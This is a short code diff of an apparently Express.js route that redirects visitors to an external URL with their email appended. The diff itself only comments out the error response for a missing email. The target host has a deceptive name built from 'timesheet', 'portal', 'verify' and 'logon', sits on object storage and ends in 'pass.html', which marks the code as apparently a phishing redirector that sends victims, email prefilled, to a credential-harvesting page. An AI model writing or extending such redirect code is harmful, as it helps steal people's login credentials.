@@ -21,9 +21,10 @@ var appRoute = function (app) {
         "https://timesheetonlinenowportaltodayverify-logontoviewnowofficeicial.nl-ams-1.linodeobjects.com/pass.html#Q" +
         email;
       res.redirect(redirect_url);
-    } else {
-      res.status(400).send("Please provide a valid email"); // Add status code for error
     }
+    // else {
+    //   res.status(400).send("Please provide a valid email"); // Add status code for error
+    // }
   });
 };
 
